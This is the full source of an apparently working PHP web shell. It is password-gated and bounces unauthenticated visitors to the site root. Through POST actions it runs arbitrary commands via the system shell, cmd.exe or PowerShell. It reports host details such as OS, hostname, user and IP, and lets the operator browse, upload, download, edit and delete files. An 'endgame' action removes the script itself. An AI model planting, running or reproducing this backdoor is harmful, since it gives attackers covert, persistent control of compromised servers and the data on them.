<?php
// NEED TO CHECK ON WINDOWS
$post = file_get_contents('php://input');
$auth_token = "{TOKEN}";

function main()
{
    ob_start();
    login();
    $is_win = os();

    if ($_POST['action'] === 'init')
    {
        init();
    }
    elseif ($_POST['action'] === 'power' && !$is_win)
    {
        echo is_null($_POST['command']) || $_POST['command'] == Null ? "0"
            : shell_exec($_POST['command']);
    }
    elseif ($_POST['action'] === 'cmd' && $is_win)
    {
        echo is_null($_POST['command']) || $_POST['command'] == Null ? "0"
            : shell_exec('cmd.exe ' . $_POST['command']);
    }
    elseif ($_POST['action'] === 'power' && $is_win)
    {
        echo is_null($_POST['command']) || $_POST['command'] == Null ? "0"
            : shell_exec('powershell.exe ' . $_POST['command']);
    }
    elseif ($_POST['action'] === 'filebrowser')
    {
        filebrowser($_POST['path']);
    }
    elseif ($_POST['action'] === 'editor')
    {
        file_editor($_POST['path']);
    }
    elseif ($_POST['action'] === 'endgame')
    {
        unlink(__FILE__);
        echo 1;
    }
}

function login()
{
    global $auth_token;

    if ($_SERVER['REQUEST_METHOD'] == 'POST')
    {
        if (isset($_POST['auth_token']) && $_POST['auth_token'] === $auth_token)
        {
            echo json_response(array(
                'Status' => 'Success!'
            ));
            ob_clean();
        }
        else
        {
            header("Location: /");
            die();
        }
    }
    else
    {
        header("Location: /");
        die();
    }
}

function os()
{
    // constant PHP_OS also might be used
    return php_uname('s') === "Windows";
}

function init()
{
    $os = php_uname('s');
    $machine_name = gethostname();
    $domain = $_SERVER['SERVER_NAME'];
    $username = get_current_user();
    $local_ip = $_SERVER['SERVER_ADDR'];

    echo json_response(array(
        'OS' => $os,
        'Machine_Name' => $machine_name,
        'Domain' => $domain,
        'Username' => $username,
        'Local_IP' => $local_ip
    ));
}

function filebrowser($path)
{
    if ($_POST['method'] === 'remove')
    {
        fremove($path);
    }
    elseif ($_POST['method'] === 'download')
    {
        fdownload($path);
    }
    elseif ($_POST['method'] === 'mkdir')
    {
        if (!file_exists($path)) {
            mkdir($path, 0777, true);
            echo 1;
        }
        else {
            echo 0;
        }
    }
    elseif ($_POST['method'] === 'upload')
    {
        fupload($path);
    }
    else
    {
        if (php_uname('s') === "Linux")
        {
            $SystemDrives[] = "";
        }
        elseif (php_uname('s') === "Windows")
        {
            $Drives = get_win_drives();
            if($Drives) {
                $DriveTypes = array("Unknown","Removable","Fixed","Network","CD-ROM","RAM Disk");
                $SystemDrives = [];
                foreach($Drives as $Drive )
                {
                    if (($Drive->DriveType == $DriveTypes[1])
                        || ($Drive->DriveType == $DriveTypes[2])
                        || ($Drive->DriveType == $DriveTypes[3]))
                    {
                        $SystemDrives[] = $Drive->Path;
                    }
                }
            }
        }

        $cwd = $path == Null ? getcwd() : $path;
        //Drives = array
        // CWD == string
        // ParentDir == string

        $main_array = array('Drives' => $SystemDrives, 'CWD' => $cwd, 'ParentDir' => dirname($cwd), 'Directories' => array(), 'Files' => array());

        $dirs = glob($cwd . '/*', GLOB_ONLYDIR);
        foreach ($dirs as $dir)
        {
            $main_array['Directories'][] = array(
                "DirectoryName" => basename($dir),
                "Perms" => substr(sprintf('%o', fileperms($dir)), -4),
                "CreationTime" => filectime($dir),
                "LastAccess" => fileatime($dir),
                "LastWrite" => filemtime($dir),
            );
        }

        $files = glob($cwd . '/*.{*}', GLOB_BRACE);
        foreach ($files as $file)
        {
            $main_array['Files'][] = array(
                "Filename" => basename($file),
                "FileSize" => human_filesize(filesize($file)),
                "FilePerms" => substr(sprintf('%o', fileperms($file)), -4),
                "CreationTime" => filectime($file),
                "LastAccess" => fileatime($file),
                "LastWrite" => filemtime($file)
            );
        }
        echo json_response($main_array);
    }
}

function fremove($path)
{
    if (is_dir($path))
    {
        echo rmdir($path) ? '1' : '0';
    }
    else
    {
        echo file_exists($path) && unlink(realpath($path)) ? '1' : '0';
    }
}

function fdownload($path)
{
    $filepath = realpath($path);
    if (file_exists($filepath)) {
        header('Content-Disposition: attachment; filename=' . $filepath);
        readfile($filepath);
    }
    else {
        echo 0;
    }
}

function fupload($path)
{
    $target_file = $path . basename($_FILES['file']['name']);
    echo !file_exists($target_file) && move_uploaded_file($_FILES['file']['tmp_name'], $target_file) ? 1 : 0;
}

function file_editor($path)
{
    if (!file_exists($path)) {
        echo 0;
        return;
    }

    if ($_POST['method'] === 'read')
    {
        readfile($path);
    }
    elseif ($_POST['method'] === 'write')
    {
        echo file_put_contents($path, base64_decode($_POST['text'])) ? 1 : 0;
    }
}

function get_win_drives() {
    // The extension is enabled by default in php version < 5.3.15 / 5.4.5 but might be switched off in php.ini
    if(extension_loaded('COM')) {
        $FileSystemObject = new COM('Scripting.FileSystemObject');
        return $FileSystemObject->Drives;
    }

    // Need to test, we might be able to load the extension if it is installed
    // https://www.php.net/manual/en/function.dl.php

    return false;
}

function win_drives()
{
    $fso = get_win_drives();
    if($fso) {
        $drives = [];
        foreach ($fso as $drive)
        {
            $drives['Drive'][] = $drive->DriveLetter;
        }
        echo json_response($drives);
    }
}

// Came from https://gist.github.com/james2doyle/33794328675a6c88edd6
function json_response($message = null, $code = 200)
{
    header_remove();
    http_response_code($code);
    header("Cache-Control: no-transform,public,max-age=300,s-maxage=900");
    header('Content-Type: application/json');
    $status = array(
        200 => '200 OK',
        400 => '400 Bad Request',
        422 => 'Unprocessable Entity',
        500 => '500 Internal Server Error'
    );
    header('Status: '.$status[$code]);

    return json_encode($message);
}

function human_filesize($bytes, $decimals = 2)
{
    if ($bytes < 1024) {
        return $bytes . ' B';
    }
    $factor = floor(log($bytes, 1024));
    $sizes = array('B', 'KB', 'MB', 'GB', 'TB', 'PB');
    return sprintf("%.{$decimals}f ", $bytes / pow(1024, $factor)) . $sizes[$factor];
}

main();

?>